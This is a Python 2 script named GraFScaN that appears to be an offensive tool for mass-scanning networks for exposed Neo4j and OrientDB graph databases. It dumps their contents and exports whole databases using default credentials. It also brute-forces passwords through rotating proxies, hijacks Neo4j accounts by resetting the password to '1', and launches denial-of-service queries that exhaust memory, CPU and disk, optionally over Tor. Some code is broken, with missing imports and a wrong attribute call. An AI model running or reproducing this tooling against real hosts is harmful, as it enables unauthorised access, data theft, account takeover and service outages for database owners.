#!/usr/bin/python
# -*- coding: utf-8 -*-

__author__ = 'M'

import requests
import sys
import json
import argparse
import ipaddress

import socks
import socket

def banner():
    print(r"""

	------------------------
	|       GraFScaN       |
	------------------------

     An analysis graph database tool
    """)
def dos_RamCpu(ip,url_query,headers):
    requests.post(url_query,json={'statements': [{'resultDataContents':['row'], 'statement':'FOREACH (x in range(1,10000000000000) | CREATE (:Person {name:"name"+x, age: x%100}));'}]},headers=headers,timeout=60).json()
def dos_disco2(ip,url_query,headers):
    requests.post(url_query,json={'statements': [{'resultDataContents':['row'], 'statement':'USING PERIODIC COMMIT 1000 LOAD CSV FROM \"https://data.cityofchicago.org/api/views/ijzp-q8t2/rows.csv?accessType=DOWNLOAD\" AS row CREATE (A:NODO:NODO2:NODO3:NODO4 {a:row[0],b:row[1],c:row[3],d:row[4]})-[:RE]->(B:NODO5:NODO6:NODO7:NODO8 {zz:row[5],dd:row[6],qq:row[7],rr:row[8]});'}]},headers=headers,timeout=10).json()
def dos_disco1(ip,url_query,url_labels,url_props,headers):
	l = []
	g={}
	labels = requests.get(url_labels,auth=('neo4j', ''),timeout=1 ).json()
	props = requests.get(url_props,auth=('neo4j', ''),timeout=1 ).json()
	for label in labels:
		for prop in props:
			g1 ={}
			g1["statement"] = str("CREATE INDEX ON:"+label+"("+prop+");")
			l.append(g1)
	g["statements"] = l
	requests.post(url_query,json=g,headers=headers)

def brutteForce_Neo4j(ip,dictpassw,dictproxies,headers):
	d = {}
	url_changepassword = "http://"+ ip +":7474/user/neo4j/password"
	data = '{"password":"1"}';
	for i,passw in enumerate(dictpassw):
		proxies = {
  			'http': 'http://'+dictproxies[i%len(dictproxies)],
		}
		r_pass = requests.post(url_changepassword, data=data, headers=headers, auth=('neo4j', passw),timeout=0.1)
		if (r_pass.status_code == 200):
			return passw

def brutteForce_Orient(ip,dictpassw):

    url_server = "http://"+ip+":2480/server"
    for passw in dictpassw:
		r_server = requests.get(url_server,auth=('root',passw),timeout=1)
		if (r_server.status_code == 200):
			return passw,r_server

def analyzeIP_Orient(ip,args):
	try:
		data_report = {}
		url = "http://"+ip+":2480/listDatabases"
		r = requests.get(url,auth=('neo4j', ''),timeout=1 )
		if (r.status_code == 200):
			json_response = r.json()
			''' Para saber info del server es necesario romper la pass de root'''			
			if args.bruteForce == True:
				p,infoServer = brutteForce_Orient(ip,args.dict)
            			data_report['server_pass'] = p
				data_report['server_info'] = infoServer.json()

			data_report['databases'] = json_response.get("databases")
			databases = json_response.get("databases")
			for database in databases:		
				url_database = "http://"+ip+":2480/export/"+database
				defaultPass=['admin','reader','writer']
				for dPass in defaultPass:
					r_data = requests.get(url_database,stream=True,auth=(dPass,dPass),timeout=1)
					if (r_data.status_code == 200):
						if not os.path.exists(ip):
    							os.makedirs(ip)
						with open(ip+"/"+database+'.gz', 'wb') as out_file:
							shutil.copyfileobj(r_data.raw, out_file)
					break;
			data_report['ip'] = ip
			return data_report
		else:
			print "The ip: " + ip + " is a OrientDB but not auth."

	except Exception as e:
		print "The ip: " + ip + " is not a OrientDB graph database."
		print e	


def analyzeIP_Neo4j(ip,args):
	try:
		data_report = {}
		url = "http://"+ip+":7474/db/data"
		r = requests.get(url,auth=('neo4j', ''),timeout=1 )
		if r.status_code == 200:
			json_response = r.json()
			data_report['version'] = json_response.get("neo4j_version")
			data_report['ip'] = ip
			url_license = "http://" + ip + ":7474/db/manage/server/version"
			data_report['license'] = requests.get(url_license,auth=('neo4j', ''),timeout=1 ).json()

			''' Query to get the stadistic of graph database '''
			url_data = "http://"+ ip +":7474/db/manage/server/jmx/query"
			payload = "[\"org.neo4j:instance=kernel#0,name=Primitive count\",\"org.neo4j:instance=kernel#0,name=High Availability\"]"
			headers = {
			    'content-type': "application/json",
			    'accept': "application/json",
			    'authorization': "Basic "
			    }
			response = requests.request("POST", url_data, data=payload, headers=headers)
			data_report['NumNodes'] = response.json()[0].get("attributes")[0].get("value")
			data_report['NumRelationships'] = response.json()[0].get("attributes")[3].get("value")
			data_report['NumProperties'] = response.json()[0].get("attributes")[1].get("value")

			''' Query to get Labels and type data '''
			url_labels = "http://" + ip + ":7474/db/data/labels"
			url_types = "http://" + ip + ":7474/db/data/relationship/types"
			url_props = "http://" + ip + ":7474/db/data/propertykeys"
			data_report['labels'] = requests.get(url_labels,auth=('neo4j', ''),timeout=1 ).json()
			data_report['types'] = requests.get(url_types,auth=('neo4j', ''),timeout=1 ).json()
	    		data_report['props'] = requests.get(url_props,auth=('neo4j', ''),timeout=1 ).json()			
					
			''' Query to get some data of the graph database '''
			url_query = "http://" + ip + ":7474/db/data/transaction/commit";
			if args.limit == False:
				data_report['info'] = requests.post(url_query,json={'statements': [{'resultDataContents':['row'], 'statement':'MATCH (n)-[r]-(m) RETURN n,r,m LIMIT 20'}]},headers=headers).json()
			else:
				data_report['info'] = requests.post(url_query,json={'statements': [{'resultDataContents':['row'], 'statement':'MATCH (n)-[r]-(m) RETURN n,r,m '}]},headers=headers).json()

			''' DoS to the Neo4j '''
			if args.DoS == True:
				try:
					dos_disco1(ip,url_query,url_labels,url_props,headers)
					dos_disco2(ip,url_query,headers)
					dos_RamCpu(ip,url_query,headers)
					
				except Exception as e:
					print "Error en la denegacion"
					
			''' Part of a cluster '''
			url_cluster_avalaible = "http://" + ip + ":7474/db/manage/server/ha/available"
			cluster_response = requests.get(url_cluster_avalaible,headers=headers,timeout=1)
			if (cluster_response.status_code == 200):
				data_report['cluster'] = True
				url_cluster_type = "http://" + ip + ":7474/db/manage/server/ha/master"
				if (url_cluster_type.text.encode('utf-8') == "true"):
				    data_report['cluster_type'] = "Master"
				else:
				    data_report['cluster_type'] = "Slave"
			else:
				data_report['cluster'] = False

			return data_report

		elif r.status_code == 401:
			json_response = r.json()
			if (json_response.keys()[0] == "errors"):
				data_report["autenticacion"] = True
	        		url_webadmin = "http://" + ip + ":7474/webadmin";
	        		headers = {
				     	'content-type': "application/json",
		             		'accept': "application/json",
	               			}
	        		r = requests.get(url_webadmin,headers=headers,timeout=1)
	        		if (r.status_code == 404 or r.status_code == 401):
	            			data_report["version"]= "> 3.X"
	        		elif (r.status_code == 200):
					data_report["version"] = "< 3.X"
					data_report["ip"] = ip
	        		if args.bruteForce == True:
					passwd_old = brutteForce_Neo4j(ip,args.dict,args.proxies,headers)
					r = requests.get(url,auth=('neo4j', '1'),timeout=1)
					if (r.status_code == 200):
						data_report["change_password"] = "yes"
						data_report["old_passwd"]= passwd_old
			    		else:
						data_report["change_password"] = "no"
				return data_report
			else:
				print "The ip: " + ip + " is not a Neo4j graph database."
		else:
			print "The ip: " + ip + " is not a Neo4j graph database."

	except Exception as e:
		print "Error" 


def getArguments(args):
	listIps=list()
    	listPassw=list()
	listProxies=list()
	arguments={}
	parser = argparse.ArgumentParser(description='SecGD analyse the input to search Neo4j graph database.')
	parser.add_argument('-neo4j', dest='neo4j', action='store_true', help='Discover and analyze Neo4j Graph database')
	parser.add_argument('-orient', dest='orient', action='store_true', help='Discover and analyze Orient Graph Database')

	parser.add_argument('-ip', dest='ip', help='Input one ip to analyse.')
	parser.add_argument('-n','--network', dest='net', help='Input one network to analyse.')
	parser.add_argument('-i', dest='fileinput', help='Input one file with one ip each line to analyse.')
	parser.add_argument("-o", dest='output', help="Output file", default="report.txt")

	parser.add_argument('-B','--bruteforce', dest='bruteForce',action='store_true', help='Option to use brute force with authentication Neo4j.')
    	parser.add_argument("-dict", dest='dict', help="Dictionary file, one password per line", default="dict.txt")
	parser.add_argument("-proxies", dest='proxies', help="Proxies file, format: <ip>:<port>", default="proxies.txt")
	parser.add_argument('-nl', '--no-limit', dest='limit', action='store_true',help='Option to dump all database of Neo4j without auth.')
	parser.add_argument('-tor', dest='tor', action='store_true',help='Option to use proxy TOR to scan de input data, need install and run before executed.')
	parser.add_argument('-DoS', dest='DoS',action='store_true', help='Option to use DoS without authentication Neo4j.')
	

	args = parser.parse_args()

    	if not args.ip and not args.fileinput and not args.net:
		print "Need one type of input, -i -ip or -n/--network"
		print parser.print_help()
		sys.exit(-1)
	elif not args.neo4j and not args.orient:
		print "Need -neo4j or -orient argument"
		print parser.print_help()
		sys.exit(-1)
	else:
		if args.ip:
			listIps.append(args.ip)
		if args.net:
			try:
				listIps = list(ipaddress.ip_network(unicode(args.net)).hosts())
			except Exception as e:
				print "Wrong value of the network.\n\n"
				print parser.print_help()
				sys.exit(-1)
		if args.fileinput:
			try:
				f = open(args.fileinput, 'r')
				for line in f:
					listIps.append(line.strip())
			except Exception as e:
				print "Wrong input file.\n\n"
				print parser.print_help()
				sys.exit(-1)

		if args.bruteForce:
			try:
			    f = open(args.dict, 'r')
			    for line in f:
				listPassw.append(line.strip())
			except Exception as e:
			    print "Wrong dict file.\n\n"
			    print parser.print_help()
			    sys.exit(-1)
			if args.neo4j:
				try:
					f = open(args.proxies, 'r')
			    		for line in f:
						listProxies.append(line.strip())
				except Exception as e:
			    		print "Wrong proxies file.\n\n"
			    		print parser.print_help()
			    		sys.exit(-1)
	args.listIps = listIps
	return args

def main():
	banner()
	results = []
	args = getArguments(sys.argv)
	if args.tor == True:
		    socks.setdefaultproxy(proxy_type=socks.PROXY_TYPE_SOCKS5, addr="127.0.0.1", port=9050)
		    socket.socket = socks.socksocket
	for ip in args.listIps:
		if args.neo4j:
			data = analyzeIP_Neo4j(str(ip),args)
			if (data is not None):
				results.append(data)
		if args.orient:
			data = analyzeIP_Orient(str(ip),args)
			if (data is not None):
				results.append(data)
	fileout = open(args.output, "a")
	json_str = json.dumps(results)
	fileout.write(json_str)
	fileout.close()

if __name__ == "__main__":
	main()

